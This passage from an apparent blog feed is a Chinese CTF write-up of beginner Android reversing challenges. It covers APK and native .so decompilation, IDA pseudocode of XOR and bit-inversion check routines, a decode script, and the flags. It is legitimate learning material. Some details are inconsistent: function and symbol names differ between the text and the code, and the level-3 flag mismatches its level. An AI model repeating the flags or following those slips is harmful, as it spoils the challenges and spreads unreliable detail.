一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">THM&#123;<span class="hljs-number">83789</span>a69074f636f64a38879cfcabe8b62305ee6&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android小记</title>
    <link href="/2025/02/11/Android%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/02/11/Android%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>最近 SWDD 师傅（Android 神!）给了几道简单的 Android 题目，我拿来做了做，感觉 Android 真有意思吧hhhhhh可惜我不会呜呜呜。做题期间在 ida 的深色和浅色模式下反复横跳，最终选择了深色（果然一开始干正事什么都变得有趣了起来）</p><span id="more"></span><h1 id="APK-反编译-level1"><a href="#APK-反编译-level1" class="headerlink" title="APK 反编译-level1"></a>APK 反编译-level1</h1><p>jeb 反编译</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4fbcd1524596e6e.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Your_are_go0d_at_Uncompile_Android!&#125;<br></code></pre></td></tr></table></figure><h1 id="Native-层反编译-level2"><a href="#Native-层反编译-level2" class="headerlink" title="Native 层反编译-level2"></a><strong>Native 层反编译</strong>-level2</h1><p><code>Native</code>层反编译，那么我们得去把 <code>so</code> 层提取出来，用 apktool</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d apk名 -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p>找到 <code>\lib\x86_64\libsummertrain.so</code> 文件丢入 ida 就出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/fb79af6175c32845.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Now_You_Know_Native_uncompile&#125;</span><br></code></pre></td></tr></table></figure><h1 id="静态注册-level3"><a href="#静态注册-level3" class="headerlink" title="静态注册-level3"></a><strong>静态注册</strong>-level3</h1><p>提取 <code>.so</code> 文件丢入 ida，找到 <code>Java_com_swdd_summertrain_MainActivity_Check</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>   ...<br>  v27 = v3;<br>  v5 = <span class="hljs-number">0LL</span>;<br>  v6 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>  &#123;<br>    v7 = v6;<br>    v8 = <span class="hljs-built_in">strlen</span>(v6);<br>    v9 = (<span class="hljs-type">char</span> *)operator new[](v8 + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( !v8 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">8</span> || v9 &lt; &amp;v7[v8] &amp;&amp; v7 &lt; &amp;v9[v8] )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>      v11 = v8 + ~v10;<br>      v12 = v8 &amp; <span class="hljs-number">3</span>;<br>      <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          ++v10;<br>          --v12;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v12 );<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v11 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v9[v10] = v7[v10] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">1</span>] = v7[v10 + <span class="hljs-number">1</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">2</span>] = v7[v10 + <span class="hljs-number">2</span>] ^ <span class="hljs-number">0x33</span>;<br>          v9[v10 + <span class="hljs-number">3</span>] = v7[v10 + <span class="hljs-number">3</span>] ^ <span class="hljs-number">0x33</span>;<br>          v10 += <span class="hljs-number">4LL</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v8 != v10 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>      v10 = <span class="hljs-number">0LL</span>;<br>LABEL_22:<br>      v26 = v10;<br>      v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8</span>LL;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v9[v26] = *(_QWORD *)&amp;v7[v26] ^ <span class="hljs-number">0x3333333333333333</span>LL;<br>        v26 += <span class="hljs-number">8LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v10 != v26 );<br>      <span class="hljs-keyword">if</span> ( v8 != v10 )<br>        <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>      v9[v8] = <span class="hljs-number">0</span>;<br>      v13 = <span class="hljs-built_in">memcmp</span>(v9, <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to &quot;</span>, v8) == <span class="hljs-number">0</span>;<br>      v14 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v15 = v14;<br>      v16 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>              a1,<br>              v14,<br>              <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v5 = _JNIEnv::NewObject(a1, v15, v16, v13, v17, v18, v27);<br>      (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, a3, v7);<br>      operator delete[](v9);<br>      <span class="hljs-keyword">return</span> v5;<br>    &#125;<br>    v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL;<br>    v20 = (((v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v21 = v20 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFE</span>LL;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v23 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v23;<br>        v24 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">48</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">32</span>] = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">32</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">48</span>] = v24;<br>        v22 += <span class="hljs-number">64LL</span>;<br>        v21 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v21 );<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    v25 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v25;<br>LABEL_20:<br>    <span class="hljs-keyword">if</span> ( v8 == v10 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_22;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码主要流程为：对字符串 <code>v6</code> 进行异或，分为几种情况：</p><ul><li>如果字符串长度小于 8，逐字节进行异或，每个字符都与 <code>0x33</code> 异或</li><li>如果长度在 8 ~ 32 之间，按 8 字节为一组进行异或，异或值是 <code>0x3333333333333333LL</code></li><li>如果长度超过 32 字节，使用 <strong>SSE 指令</strong>（<code>_mm_xor_ps</code>），每次处理 16 字节，用一个全局常量 <code>xmmword_CA80</code> 进行异或</li></ul><p>解码后的字符串会与一个固定字符串 <code>U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to</code> 进行比较，相等则正确，exp 如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;immintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">char</span>* encoded, <span class="hljs-type">size_t</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; i += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-type">uint64_t</span>* block = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">uint64_t</span>*&gt;(encoded + i);<br>            *block ^= <span class="hljs-number">0x3333333333333333LL</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* originalEncodedString = <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to&quot;</span>;<br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(originalEncodedString);<br><br>    <span class="hljs-comment">// 动态分配内存，防止栈溢出</span><br>    <span class="hljs-type">char</span>* encodedString = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[length + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">strcpy</span>(encodedString, originalEncodedString);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;加密字符串: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-built_in">decode</span>(encodedString, length);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;解密后的字符串: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 释放动态分配的内存</span><br>    <span class="hljs-keyword">delete</span>[] encodedString;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e02ce8479e10fbfa.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="动态注册-level4"><a href="#动态注册-level4" class="headerlink" title="动态注册-level4"></a><strong>动态注册</strong>-level4</h1><p>动态注册的方法一般来说需要分析 <code>JNI_OnLoad</code> 函数，把 <code>libsummertrain.so</code> 丢进 ida分析</p><p><img src="https://img.dkdun.cn/v1/2025/12/5c77e2e9e0f3031a.png"></p><p>emmmmm，这里我似乎没分析出什么来，然后看了眼其他函数，发现了 <code>sub_172E0</code> 函数有东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_110B0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>    ...<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">676</span>))(a1, a3, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    v4 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3;<br>    v5 = <span class="hljs-built_in">strlen</span>(v3);<br>    v6 = (_BYTE *)operator new[](v5 + <span class="hljs-number">1</span>);<br>    v7 = v5;<br>    v8 = v6;<br>    <span class="hljs-keyword">if</span> ( !v7 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    v9 = <span class="hljs-number">0</span>;<br>    v24 = v7;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8 &lt; v4 + v7 &amp;&amp; v4 &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;v8[v7] )<br>      <span class="hljs-keyword">goto</span> LABEL_17;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>LABEL_14:<br>      v17 = v9;<br>      v9 = v7 &amp; <span class="hljs-number">0xFFFFFFF8</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v8[v17] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)(v4 + v17)), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>        v17 += <span class="hljs-number">8</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v9 != v17 );<br>      <span class="hljs-keyword">if</span> ( v7 != v9 )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>LABEL_21:<br>      v8[v7] = <span class="hljs-number">0</span>;<br>      v25 = <span class="hljs-built_in">memcmp</span>(v8, &amp;unk_78FD, v7) == <span class="hljs-number">0</span>;<br>      v20 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">24</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v21 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">132</span>))(a1, v20, <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>, <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v22 = _JNIEnv::NewObject(a1, v20, v21, v25);<br>      (*(<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">680</span>))(a1);<br>      operator delete[](v8);<br>      <span class="hljs-keyword">return</span> v22;<br>    &#125;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>;<br>    v10 = (v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>) - <span class="hljs-number">32</span>;<br>    v11 = (v10 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v10 )<br>    &#123;<br>      v12 = v11 &amp; <span class="hljs-number">0xFFFFFFFE</span>;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v14 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v14;<br>        v15 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">48</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">32</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">48</span>] = v15;<br>        v13 += <span class="hljs-number">64</span>;<br>        v12 -= <span class="hljs-number">2</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v12 );<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    v16 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v16;<br>LABEL_12:<br>    v7 = v24;<br>    <span class="hljs-keyword">if</span> ( v24 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    <span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>    &#123;<br>LABEL_17:<br>      v18 = v7 + ~v9;<br>      <span class="hljs-keyword">for</span> ( i = v7 &amp; <span class="hljs-number">3</span>; i; --i )<br>      &#123;<br>        v8[v9] = ~*(_BYTE *)(v4 + v9);<br>        ++v9;<br>      &#125;<br>      v7 = v24;<br>      <span class="hljs-keyword">if</span> ( v18 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v8[v9] = ~*(_BYTE *)(v4 + v9);<br>          v8[v9 + <span class="hljs-number">1</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">1</span>);<br>          v8[v9 + <span class="hljs-number">2</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">2</span>);<br>          v8[v9 + <span class="hljs-number">3</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">3</span>);<br>          v9 += <span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v24 != v9 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_14;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先用 <code>v5</code> 存储调用 <code>(*(_QWORD *)a1 + 1352LL)</code> 所返回的字符串，<code>v6</code> 指向指向 <code>v5</code>，然后 <code>v8</code>来存储字符串</p><p>而且代码根据字符串长度进行不同的解密处理：</p><ul><li><strong>长度小于 8 的情况</strong>，逐字节进行按位<strong>取反</strong></li><li><strong>长度大于或等于 8 小于 32 的情况</strong>，利用 <strong><code>_mm_xor_si128</code></strong> 进行 8 字节为单位的批量解密</li><li><strong>长度大于或等于 32 的情况</strong>，一次处理 64 字节<ul><li>**<code>_mm_xor_si128</code>**：通过向量化操作，将 16 字节数据与 <code>-1</code> 进行异或，相当于每个字节都执行 <code>~</code> 操作（按位取反）</li></ul></li></ul><p>代码中有一句 <code>v12 = memcmp(v8, &amp;unk_DCF0, v7) == 0</code>，主要作用是通过 <strong><code>memcmp</code></strong> 函数比较两个内存区域的内容是否相等，那么 <code>v5</code> 中的字符串就存储在 <code>unk_DCF0</code> 中，提取出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/52d5d49ec7b27e07.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x99</span>, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>xB1, 